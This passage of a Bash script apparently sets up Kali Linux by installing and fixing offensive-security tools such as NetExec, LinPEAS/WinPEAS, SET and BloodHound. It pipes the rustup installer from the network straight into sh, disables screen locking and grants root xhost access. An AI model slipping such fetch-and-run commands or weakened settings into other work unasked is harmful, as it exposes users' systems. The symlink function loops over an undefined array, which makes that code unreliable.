Installing ${each_app}\"\n        apt-get --quiet install -y ${each_app} >/dev/null 2>&1\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n      else\n        echo -e \"${spaces}${greenplus} $each_app is installed\"\n      fi\n    done\n    }\n\n\nis_installed_remove() {\n    app=\"$@\"\n\n    for each_app in ${app}\n    do\n      echo -e \"\\n  ${greenplus} Checking if ${each_app} is installed\"\n      is_app_installed=$(apt-cache policy ${each_app} | grep -i -c \"100 \\/var\\/lib\\/dpkg\\/status\")\n\n      if [[ $is_app_installed -ge 1 ]]\n      then\n        clean_vars\n        APP=\"apt\"\n        FUNCTYPE=\"remove ${each_app}\"\n        echo -e \"${spaces}${greenplus} Removing ${each_app} \\n\"\n        apt remove -y ${each_app} >/dev/null 2>&1\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n      else\n        echo -e \"${spaces}${greenminus} ${each_app} is not installed \\n\"\n      fi\n    done\n    }\n\n\nis_installed_reinstall() {\n    app=\"$@\"\n\n    for each_app in ${app}\n    do\n      echo -e \"\\n  ${greenplus} Checking if ${each_app} is installed\"\n      is_app_installed=$(apt-cache policy ${each_app} | grep -i -c \"100 \\/var\\/lib\\/dpkg\\/status\")\n\n      if [[ $is_app_installed -ge 1 ]]\n      then\n        clean_vars\n        APP=\"apt\"\n        FUNCTYPE=\"reinstall ${each_app}\" >/dev/null 2>&1\n        echo -e \"${spaces}${greenplus} Reinstalling ${each_app}\"\n        apt reinstall -y ${each_app} >/dev/null 2>&1\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n      else\n        echo -e \"${spaces}${greenminus} ${each_app} is already installed \\n\"\n      fi\n    done\n    }\n\n\napt_update() {\n    echo -e \"\\n  ${greenplus} running: apt update \\n\"\n    APP=\"apt\"\n    FUNCTYPE=\"update\"\n    eval apt -y update\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    export APT_UPDATE_RAN=1\n    }\n\n\napt_upgrade() {\n    echo -e \"\\n  ${greenplus} running: apt upgrade \\n\"\n    APP=\"apt\"\n    FUNCTYPE=\"upgrade\"\n    eval apt -y upgrade\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\napt_autoremove() {\n    echo -e \"\\n  ${greenplus} running: apt autoremove \\n\"\n    APP=\"apt\"\n    FUNCTYPE=\"autoremove\"\n    eval apt -y autoremove\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\napt_fixbroken() {\n    APP=\"apt\"\n    FUNCTYPE=\"--fix-broken install\"\n    eval apt -y --fix-broken install >/dev/null 2>&1\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\nfix_missing() {\n    fix_kali_lightdm_theme_and_background\n    fix_sources \n    setup_binfmt_mount\n    fix_hushlogin\n    fix_grub\n    fix_smbconf\n    fix_libwacom\n    apt_autoremove\n    check_installed_linuxheaders\n    check_installed_dkms\n    install_pip2\n    install_pip3\n    fix_pip2_pip3\n    install_pipx\n    install_pip2_modules\n    install_pip3_modules\n    install_golang\n    eval apt -y remove kali-undercover >/dev/null 2>&1\n    is_installed \"libu2f-udev virt-what neo4j dkms build-essential autogen automake python3-setuptools python$pyver-dev libguestfs-tools cifs-utils dbus-x11\"\n    fix_gedit\n    fix_root_connectionrefused\n    fix_htop\n    fix_nmap\n    fix_rockyou\n    fix_theharvester\n    silence_pcbeep\n    disable_power_checkde\n    fix_spike\n    fix_set\n    fix_amass\n    fix_httprobe\n    fix_assetfinder\n    fix_chrome\n    fix_gowitness\n    fix_mitm6\n    fix_linwinpeas\n    fix_neo4j\n    fix_bloodhound\n    fix_proxychains\n    fix_sshuttle\n    fix_chisel\n    fix_cme\n    fix_netexec\n    fix_ssh_widecompat\n    fix_waybackurls\n    fix_dockercompose\n    fix_ghidra\n    fix_locate\n    fix_seclists\n    fix_flameshot\n    install_plumhound\n    install_enumforlinux_ng\n    install_enumforlinux\n    install_sqlmap\n    install_hydra\n    install_wfuzz\n    install_ffuf\n    install_gobuster\n    install_vscode\n    }\n\n\nfix_all() {\n    make_rootgreatagain \n    fix_missing\n    apt_autoremove \n    apt_fixbroken\n    virt_what\n    check_vm\n    }\n\n\nfix_dockercompose() {\n    DOCKERCOMPOSE_RELEASE_URL=\"https://github.com/docker/compose/releases/\"\n    DOCKERCOMPOSE_RELEASE_HTML=$(curl -s \"$DOCKERCOMPOSE_RELEASE_URL\")\n    DOCKERCOMPOSE_LATEST_VERSION=$(echo \"$DOCKERCOMPOSE_RELEASE_HTML\" | grep -oP 'href=\"/docker/compose/releases/tag/v\\K[0-9.]+(?=\")' | head -n 1)\n    if [ -z \"$DOCKERCOMPOSE_LATEST_VERSION\" ]; then\n      echo -e \"\\n  ${redexclaim} Error: Unable to find the latest Docker Compose version from Github\"\n      exit 1\n    fi\n    DOCKERCOMPOSE_DOWNLOAD_URL=\"https://github.com/docker/compose/releases/download/v$DOCKERCOMPOSE_LATEST_VERSION/docker-compose-$(uname -s)-$(uname -m)\"\n    \n    if command -v docker-compose &> /dev/null;\n      then\n        SYSTEM_DOCKERCOMPOSE_VER=$(docker-compose --version | awk '{print $4}' | tr -d \"v\")\n        EXIT_STATUS=\"$?\"\n      else\n        EXIT_STATUS=\"127\"\n    fi\n\n    case ${EXIT_STATUS} in\n        0)\n          # exit code 0, docker compose is installed, compare versions and upgrade if newer is available\n          echo -e \"\\n\\n  ${greenplus} Local $(whereis docker-compose) found. Comparing versions...\"\n          if [[ \"$DOCKERCOMPOSE_LATEST_VERSION\" > \"$SYSTEM_DOCKERCOMPOSE_VER\" ]]; then\n              echo -e \"${spaces}${greenminus} Installed Docker Compose Ver = $SYSTEM_DOCKERCOMPOSE_VER\"\n              echo -e \"${spaces}${greenminus} Github Latest Docker Compose = $DOCKERCOMPOSE_LATEST_VERSION\"\n              echo -e \"${spaces}${greenplus} Installing latest DockerCompose \\n\"\n             \n              is_installed \"build-essential python3-dev docker.io python3-setuptools python3-wheel python3-wheel-common cython3 python3-pip python3-pip-whl\"\n              echo -e \"${spaces}${greenplus} Latest Docker Compose version: $DOCKERCOMPOSE_LATEST_VERSION\"\n              echo -e \"${spaces}${greenplus} Downloading Docker Compose: $DOCKERCOMPOSE_DOWNLOAD_URL to /usr/local/bin/docker-compose\"\n              curl -L \"$DOCKERCOMPOSE_DOWNLOAD_URL\" -o /usr/local/bin/docker-compose\n              echo -e \"${spaces}${greenplus} Making /usr/local/bin/docker-compose executable\"\n              chmod +x /usr/local/bin/docker-compose\n              echo -e \"${spaces}${greenplus} Docker Compose installed successfully $(docker-compose --version | awk {'print $4'})\"\n          else\n              echo -e \"${spaces}${greenminus} Installed Docker Compose Ver = $SYSTEM_DOCKERCOMPOSE_VER\"\n              echo -e \"${spaces}${greenminus} Github Latest Docker Compose = $DOCKERCOMPOSE_LATEST_VERSION\"\n              echo -e \"${spaces}${greenplus} Versions Match, exiting\"\n          fi\n          ;;\n      127)\n            # exit code 127 docker-compose is not found, install from\n            echo -e \"\\n\\n  ${redexclaim} Docker Compose command not found, installing...\"\n            \n            is_installed \"build-essential python3-dev docker.io python3-setuptools python3-wheel python3-wheel-common cython3 python3-pip python3-pip-whl\"\n            echo -e \"\\n  ${greenplus} Latest Docker Compose version: $DOCKERCOMPOSE_LATEST_VERSION\"\n            echo -e \"${spaces}${greenplus} Downloading Docker Compose: $DOCKERCOMPOSE_DOWNLOAD_URL to /usr/local/bin/docker-compose\\n\"\n            curl -L \"$DOCKERCOMPOSE_DOWNLOAD_URL\" -o /usr/local/bin/docker-compose\n            echo -e \"${spaces}${greenplus} Making /usr/local/bin/docker-compose executable\"\n            chmod +x /usr/local/bin/docker-compose\n            echo -e \"${spaces}${greenplus} Docker Compose installed successfully $(docker-compose --version | awk {'print $4'})\"\n            ;;\n        *)\n            # catch all other exit codes\n            echo -e \"\\n  ${redexclaim} Unknown error code ${EXIT_STATUS}\"\n            ;;\n    esac\n    }\n\n\nfix_kali_lightdm_theme_and_background () {\n    APP=\"sed\"\n    FUNCTYPE=\"update lightdm-gtk-greeter.conf\"\n    sed s:\"Kali-Light\":\"Kali-Dark\":g -i /etc/lightdm/lightdm-gtk-greeter.conf\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\ninstall_rustup() {\n    echo -e \"\\n  ${greenminus} Installing Rust\"\n    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -sSf | sh -s -- -y\n    APP=\"rustup\"\n    FUNCTYPE=\"install\"\n    sudo -i -u $finduser curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -sSf | sh -s -- -y\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\ninstall_cargo() {\n    is_installed \"cargo libssl-dev\"\n    }\n\n\nfix_libwacom() {\n    is_installed \"libwacom-common\"\n    }\n\n\nfix_neo4j() {\n    is_installed \"neo4j\"\n    }\n\n\nfix_bloodhound() {\n    is_installed \"bloodhound\"\n    }\n\n\nfix_proxychains() {\n    is_installed \"proxychains\"\n    }\n\n\nfix_sshuttle() { \n    is_installed \"sshuttle\" \n    }\n\n\nfix_chisel() {\n    is_installed \"chisel\"\n    }\n\n\nfix_cme() {\n    is_installed \"crackmapexec\"\n     }    \n\n\nfix_nxc_symlinks() { \n    findrealuser=$(logname) \n    getshell=$(echo $SHELL | cut -d \"/\" -f4)\n\n    nxcbin_path=\"$HOME/.local/share/pipx/venvs/netexec/bin/\"\n    localbin_path=\"$HOME/.local/bin/\"\n\n    nxc_symlink_array=( 'netexec' 'NetExec' 'nxc' 'nxcdb' )\n    for nxc_symlink_array_file in ${cme_symlink_array[@]}; do\n      echo $cme_symlink_array_file > /tmp/nxcsymlink.tmp\n      # sanity check \n      # runuser $findrealuser $getshell -c 'echo -e \"\\n $HOME/.local/share/pipx/venvs/crackmapexec/bin/$(cat /tmp/cmesymlink.tmp) $HOME/.local/bin/$(cat /tmp/cmesymlink.tmp)\"'\n      echo -e \"${spaces}${greenplus} Creating symlink for user $findrealuser to ~/.local/bin/$nxc_symlink_array_file  \" \n      runuser $findrealuser $getshell -c 'symlink_file=$(cat /tmp/nxcsymlink.tmp); ln -sf $HOME/.local/share/pipx/venvs/netexec/bin/$symlink_file $HOME/.local/bin/$symlink_file'\n    done\n\n    rm -f /tmp/nxcsymlink.tmp\n    }\n\n\nfix_netexec() {\n    findrealuser=$(logname)\n    echo -e \"\\n  ${greenplus} Installing Netexec (nxc)\" \n\n    # root installation \n    if [[ $findrealuser == \"root\" ]];\n     then\n       echo -e \"${spaces}${greenplus} Starting ${findrealuser} user installation\"\n       is_installed \"pipx python3-venv python3-poetry\"\n       pipx install git+https://github.com/Pennyw0rth/NetExec --force\n       getshell=$(echo $SHELL | cut -d \"/\" -f4)\n       check_for_local_bin_path=$(cat \"$HOME/.$getshell\"rc | grep -i \"PATH=\" | grep -i \"\\$HOME\\/\\.local\\/bin\" -c)\n\n       if [[ $check_for_local_bin_path -eq 0 ]];\n        then\n         echo \"export PATH=\\$HOME/.local/bin:\\$PATH\" >> $HOME/.$getshell\"rc\"\n        else \n         echo \"\\n  ${redexclaim} Path already exists for user ${findrealuser}\"\n       fi\n       fix_nxc_symlinks \n      fi\n\n     # user installation \n     if [[ $findrealuser != \"root\" ]];\n      then\n        echo -e \"${spaces}${greenplus} Starting $findrealuser user installation\"\n        is_installed \"pipx python3-venv python3-poetry\"\n\n        sudo -i -u $findrealuser sh -c 'pipx install git+https://github.com/Pennyw0rth/NetExec --force'\n        getshell=$(echo $SHELL | cut -d \"/\" -f4)\n        subshell=$(runuser $findrealuser $getshell -c 'echo $SHELL | cut -d \"/\" -f4')\n        checkforlocalbinpath=$(cat /home/$findrealuser/.$subshell\"rc\" | grep -i PATH= | grep -i \"\\$HOME\\/\\.local\\/bin:\\$PATH\" -c)\n        \n        if [[ $checkforlocalbinpath -eq 0 ]]\n          then\n            runuser $findrealuser $getshell -c 'subshell=$(echo $SHELL | cut -d \"/\" -f4); echo \"export PATH=\\$HOME/.local/bin:\\$PATH\" >> $HOME/.$subshell\"rc\"'\n            runuser $findrealuser $getshell -c 'subshell=$(echo $SHELL | cut -d \"/\" -f4); source $HOME/.$subshell\"rc\"' \n          else \n            echo -e \"\\n $redexclaim Path already exists \"\n        fi\n        \n        fix_nxc_symlinks \n      fi\n    }\n\n\nfix_assetfinder() {\n    is_installed \"assetfinder\"\n    }\n\n\nfix_httprobe() {\n    is_installed \"httprobe\"\n    }\n\n\nfix_amass() {\n    is_installed \"amass\"\n    }\n\n\nfix_mitm6() {\n    is_installed \"mitm6\"\n    }\n\n\nfix_gedit() {\n    is_installed \"gedit\"\n    }\n\n\nfix_set() {\n    echo -e \"\\n  ${greenplus} Installing Social Engineering Toolkit\" \n    is_installed \"libssl-dev set gcc-mingw-w64-x86-64-win32\"\n    }\n\n\nfix_ssh_widecompat() { \n    echo -e \"\\n  ${greenplus} Setting SSH for wide compatibility\"\n    eval cp -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf\n    echo -e \"${spaces}${greenplus} Restarting SSH service for wide compatibility\"\n    APP=\"systemctl\"\n    FUNCTYPE=\"restart ssh\"\n    eval systemctl restart ssh\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\nfix_waybackurls() {\n    echo -e \"\\n  ${greenplus} Installing waybackrust \\n\"\n    WAYBACKRUST_URL=\"https://github.com/Neolex-Security/WaybackRust/releases/download/v0.2.12/waybackrust-x86_64-unknown-linux-gnu.tar.gz\"\n    WAYBACKRUST_DEST=\"/tmp/waybackrust-x86_64-unknown-linux-gnu.tar.gz\"\n\n    if [ ! -f /usr/bin/waybackrust ] \n      then \n        APP=\"wget\"\n        FUNCTYPE=\"download\"\n        wget --quiet \"$WAYBACKRUST_URL\" -O $WAYBACKRUST_DEST\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n    fi\n\n    if [ -f $WAYBACKRUST_DEST ]\n      then\n        APP=\"tar\"\n        FUNCTYPE=\"extract\"\n        tar xvfz $WAYBACKRUST_DEST -C /usr/bin >/dev/null 2>&1\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n    fi\n\n    if [ -f /usr/bin/waybackrust ] \n      then\n        echo -e \"${spaces}${greenplus} /usr/bin/waybackrust found, making executable\"\n        chmod +x /usr/bin/waybackrust\n        echo -e \"${spaces}${greenplus} $(waybackrust --version) installed\"\n      else \n        echo -e \"${spaces}${greenplus} /usr/bin/waybackrust not found\" \n    fi \n    }\n\n\nfix_linwinpeas() {\n    # get all the peas!!!\n    current_build=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep -i \"refs/heads/master\" -m 1 | awk '{ print $5 }' | cut -d \"<\" -f1)\n    releases_url=\"https://github.com/peass-ng/PEASS-ng/releases/download/$current_build\"\n\t  dest_linpeas=\"/opt/linpeas\"\n\t  dest_winpeas=\"/opt/winpeas\"\n    \n    # linpeas to /opt/linpeas\n\t  echo -e \"\\n  ${greenplus} Downloading all the linpeas from build $current_build\"\n    [ ! -d $dest_linpeas ] && mkdir $dest_linpeas || echo > /dev/null \n    \n    linpeas_arr=('linpeas.sh' 'linpeas_darwin_amd64' 'linpeas_darwin_arm64' 'linpeas_fat.sh' 'linpeas_linux_386' 'linpeas_linux_amd64' 'linpeas_linux_arm')\n      for linpeas_file in ${linpeas_arr[@]}; do\n        clean_vars\n        APP=\"download\"\n        FUNCTYPE=$(echo ${linpeas_file})\n        echo -e \"${spaces}${greenplus} Downloading $linpeas_file to $dest_linpeas/$linpeas_file\"\n        wget -q $releases_url/$linpeas_file -O $dest_linpeas/$linpeas_file\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n        chmod +x $dest_linpeas/$linpeas_file \n     done\n\n    # winpeas to /opt/winpeas\n\t  echo -e \"\\n  ${greenplus} Downloading all the winpeas from build $current_build\"\n    [ ! -d $dest_winpeas ] && mkdir $dest_winpeas || echo > /dev/null \n    \n    winpeas_arr=('winPEAS.bat' 'winPEASany.exe' 'winPEASany_ofs.exe' 'winPEASx64_ofs.exe' 'winPEASx86.exe' 'winPEASx86_ofs.exe')\n      for winpeas_file in ${winpeas_arr[@]}; do\n        clean_vars\n        APP=\"download\"\n        FUNCTYPE=$(echo ${winpeas_file})\n        echo -e \"${spaces}${greenplus} Downloading $winpeas_file to $dest_winpeas/$winpeas_file\"\n        wget -q $releases_url/$winpeas_file -O $dest_winpeas/$winpeas_file\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n        chmod +x $dest_winpeas/$winpeas_file \n     done\n    }\n\n\nfix_chrome() {\n    echo -e \"\\n  ${greenplus} Checking if google-chrome is installed \"\n    if [[ \"$arch\" == \"arm64\" ]];\n      then \n        echo -e \"${spaces}${redexclaim} Google-Chrome is not available for this platform $arch -- skipping\"\n      elif [[ \"$arch\" == \"amd64\" ]];\n        then\n          if [[ -f /usr/bin/google-chrome ]];\n            then\n              echo -e \"${spaces}${greenminus} google-chrome already installed, skipping\"\n            else\n              clean_vars\n              APP=\"google-chrome\"\n              FUNCTYPE=\"download\"\n              echo -e \"\\n  ${greenplus} Gowitness dependancy google-chrome for $arch \\n\"\n              eval wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb -O /tmp/google-chrome-stable_current_amd64.deb\n              EXIT_STATUS=\"$?\"\n              check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n              clean_vars\n\n              is_installed \"libu2f-dev\"\n\n              echo -e \"${spaces}${greenplus} Installing Google-Chrome\"\n              APP=\"dpkg\"\n              FUNCTYPE=\"install google-chrome-stable_current_amd64.deb\" \n              eval dpkg -i /tmp/google-chrome-stable_current_amd64.deb\n              EXIT_STATUS=\"$?\"\n              check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n              clean_vars\n              rm -f /tmp/google-chrome-stable_current_amd64.deb\n          fi\n    fi \n    }\n\n\nfix_hushlogin() {\n    echo -e \"\\n  ${greenplus} Checking for .hushlogin\"\n    if [ $finduser = \"root\" ]\n     then\n      if [ -f /root/.hushlogin ]\n       then\n        echo -e \"${spaces}${greenminus} /$finduser/.hushlogin exists - skipping\"\n      else\n        echo -e \"${spaces}${greenplus} Creating file /$finduser/.hushlogin\"\n        touch /$finduser/.hushlogin\n      fi\n    else\n      if [ -f /home/$finduser/.hushlogin ]\n       then\n        echo -e \"${spaces}${greenminus} /home/$finduser/.hushlogin exists - skipping\"\n      else\n        echo -e \"${spaces}${greenplus} Creating file /home/$finduser/.hushlogin\"\n        touch /home/$finduser/.hushlogin\n      fi\n    fi\n    }\n\n\ndisable_power_gnome() {\n    # CODE CONTRIBUTION : pswalia2u - https://github.com/pswalia2u\n    fix_hushlogin\n    echo -e \"\\n  ${greenplus} Gnome detected - Disabling Power Savings\"\n    # ac power\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing      # Disables automatic suspend on charging)\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing\"\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-timeout 0         # Disables Inactive AC Timeout\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power sleep-inactive-ac-timeout 0\"\n    # battery power\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-type nothing # Disables automatic suspend on battery)\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power sleep-inactive-battery-type nothing\"\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-timeout 0    # Disables Inactive Battery Timeout\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power sleep-inactive-battery-timeout 0\"\n    # power button\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power power-button-action nothing         # Power button does nothing\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power power-button-action nothing\"\n    # idle brightness\n    sudo -i -u $finduser gsettings set org.gnome.settings-daemon.plugins.power idle-brightness 0                   # Disables Idle Brightness\n     echo -e \"  ${greenplus} org.gnome.settings-daemon.plugins.power idle-brightness 0\"\n    # screensaver activation\n    sudo -i -u $finduser gsettings set org.gnome.desktop.session idle-delay 0                                      # Disables Idle Activation of screensaver\n     echo -e \"  ${greenplus} org.gnome.desktop.session idle-delay 0\"\n    # screensaver lock\n    sudo -i -u $finduser gsettings set org.gnome.desktop.screensaver lock-enabled false                            # Disables Locking\n     echo -e \"  ${greenplus} org.gnome.desktop.screensaver lock-enabled false\\n\"\n    }\n\n\ndisable_power_xfce() {\n    if [ $finduser = \"root\" ]\n     then\n      echo -e \"\\n  ${greenplus} XFCE Detected - disabling xfce power management\"\n      OUTPUT_FILE=/root/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-power-manager.xml\n      echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>' > $OUTPUT_FILE\n      echo '' >> $OUTPUT_FILE\n      echo '<channel name=\"xfce4-power-manager\" version=\"1.0\">' >> $OUTPUT_FILE\n      echo '  <property name=\"xfce4-power-manager\" type=\"empty\">' >> $OUTPUT_FILE\n      echo '    <property name=\"power-button-action\" type=\"empty\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"show-panel-label\" type=\"empty\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"show-tray-icon\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"lock-screen-suspend-hibernate\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"logind-handle-lid-switch\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"blank-on-ac\" type=\"int\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"dpms-on-ac-sleep\" type=\"uint\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"dpms-on-ac-off\" type=\"uint\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '  <property name=\"dpms-enabled\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '  </property>' >> $OUTPUT_FILE\n      echo '</channel>' >> $OUTPUT_FILE\n      echo -e \"${spaces}${greenplus} XFCE power management disabled for user: $finduser\"\n    else\n      echo -e \"\\n  ${greenplus} XFCE Detected - disabling xfce power management\"\n      OUTPUT_FILE=/home/$finduser/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-power-manager.xml\n      echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>' > $OUTPUT_FILE\n      echo '' >> $OUTPUT_FILE\n      echo '<channel name=\"xfce4-power-manager\" version=\"1.0\">' >> $OUTPUT_FILE\n      echo '  <property name=\"xfce4-power-manager\" type=\"empty\">' >> $OUTPUT_FILE\n      echo '    <property name=\"power-button-action\" type=\"empty\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"show-panel-label\" type=\"empty\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"show-tray-icon\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"lock-screen-suspend-hibernate\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"logind-handle-lid-switch\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"blank-on-ac\" type=\"int\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"dpms-on-ac-sleep\" type=\"uint\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '    <property name=\"dpms-on-ac-off\" type=\"uint\" value=\"0\"/>' >> $OUTPUT_FILE\n      echo '  <property name=\"dpms-enabled\" type=\"bool\" value=\"false\"/>' >> $OUTPUT_FILE\n      echo '  </property>' >> $OUTPUT_FILE\n      echo '</channel>' >> $OUTPUT_FILE\n      chown $finduser:$finduser /home/$finduser/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-power-manager.xml\n      echo -e \"${spaces}${greenplus} XFCE power management disabled for user: $finduser\"\n    fi\n    }\n\n# disable_power_kde() {\n#    # need to work up a kde power management solution before implementing\n# }\n\ndisable_power_checkde() {\n    detect_xfce=$(ps -e | grep -c -E '^.* xfce4-session$')\n    detect_gnome=$(ps -e | grep -c -E '^.* gnome-session-*')\n    #detect_kde=$(ps -e | grep -c -E '^.* kded4$')\n    [ $detect_gnome -ne 0 ] && detected_env=\"GNOME\"\n    [ $detect_xfce -ne 0 ] && detected_env=\"XFCE\"\n    # [ $detect_kde -ne 0 ] && detected_env=\"KDE\"\n    echo -e \"\\n  ${greenplus} Detected Environment: $detected_env\"\n    [ $detected_env = \"GNOME\" ] && disable_power_gnome\n    [ $detected_env = \"XFCE\" ] && disable_power_xfce\n    [ $detected_env = \"\" ] && echo -e \"\\n  ${redexclaim} Unable to determine desktop environment\"\n    # [ $detected_env = \"KDE\" ] && disable_power_kde\n    }\n\nsilence_pcbeep() {\n    echo -e \"blacklist pcspkr\" > /etc/modprobe.d/nobeep.conf\n    echo -e \"\\n  ${greenplus} Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \\n\"\n    }\n\n\nfix_spike() {\n    is_spike_hold=$(apt-mark showhold | grep -i -c \"spike\")\n\n    if [[ $is_spike_hold -eq 1 ]]\n      then \n        apt-mark unhold spike\n    fi\n\n    is_installed_remove \"spike\"\n   \n    APP=\"wget\"\n    FUNCTYPE=\"download spike_2.9-1kali6_${arch}.deb\"\n    eval wget https://old.kali.org/kali/pool/main/s/spike/spike_2.9-1kali6_$arch.deb -O /tmp/spike_2.9-1kali6_$arch.deb\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    \n    APP=\"dpkg\"\n    FUNCTYPE=\"install\"\n    echo -e \"\\n  ${greenplus} installing spike 2.9 for $arch ... \\n\"\n    eval dpkg -i /tmp/spike_2.9-1kali6_$arch.deb\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n\n    echo -e \"${spaces}${greenplus} spike 2.9 installed \\n\"\n    rm -f /tmp/spike_2.9-1kali6_$arch.deb \n    eval apt-mark hold spike >/dev/null 2>&1\n    echo -e \"${spaces}${greenplus} apt hold placed on spike package\"\n    }\n\n\nfix_liblibc() {\n    if [[ \"$arch\" == \"amd64\" ]] \n      then \n        if [[ ! -f /usr/lib/x86_64-linux-gnu/liblibc.a ]]\n          then\n            ln -sf /usr/lib/x86_64-linux-gnu/libc.a /usr/lib/x86_64-linux-gnu/liblibc.a \n            echo -e \"\\n  ${greenplus} Fixing $arch liblibc.a symlink /usr/lib/x86_64-linux-gnu/liblibc.a\"\n        fi \n    fi\n\n    if [[ \"$arch\" == \"arm64\" ]]\n      then \n        if [[ ! -f /usr/lib/aarch64-linux-gnu/liblibc.a ]]\n          then \n          ln -sf /usr/lib/aarch64-linux-gnu/libc.a /usr/lib/aarch64-linux-gnu/liblibc.a \n          echo -e \"\\n  ${greenplus} Fixing $arch liblibc.a symlink..\"\n        fi\n    fi\n    }\n\n\nfix_gowitness() {\n    check_gowitness=$(apt-cache policy gowitness |  grep -i -c \"100 \\/var\\/lib\\/dpkg\\/status\")\n    if [[ $check_gowitness -eq 0 ]]\n      then\n        REPO_URL=\"https://github.com/sensepost/gowitness/tags\"\n        LATEST_VERSION=$(curl -s \"$REPO_URL\" | grep -oPm1 '/sensepost/gowitness/releases/tag/\\K[\\d.]+')\n        echo -e \"\\n  ${greenplus} Installing gowitness $LATEST_VERSION for ${arch} from github\"\n        \n        [ -f /usr/bin/gowitness ] && rm -f /usr/bin/gowitness\n\n        APP=\"wget\"\n        FUNCTYPE=\"download gowitness-${LATEST_VERSION}\"\n        echo -e \"${spaces}${greenplus} Downloading gowitness ${arch} binary...\\n\"\n        eval wget -q https://github.com/sensepost/gowitness/releases/download/${LATEST_VERSION}/gowitness-${LATEST_VERSION}-linux-$arch -O /usr/bin/gowitness\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n        chmod +x /usr/bin/gowitness\n        rm -f /tmp/releases.gowitness > /dev/null\n      else\n        echo -e \"${spaces}${greenplus} Uninstalling Gowitness\"\n        is_installed_remove \"gowitness\"\n        fix_gowitness\n    fi\n    }\n\n\nfix_root_connectionrefused() {\n    echo -e \"\\n  ${greenplus} Adding root to xhost for $finduser display\"\n    eval sudo -i -u $finduser xhost +SI:localuser:root >/dev/null 2>&1\n    eval xhost +SI:localuser:root >/dev/null 2>&1\n    echo -e \"${spaces}${greenplus} root added to xhost\"\n    }\n\n\nfix_rockyou() {\n    ROCKYOU_GZIP=\"/usr/share/wordlists/rockyou.txt.gz\"\n    if 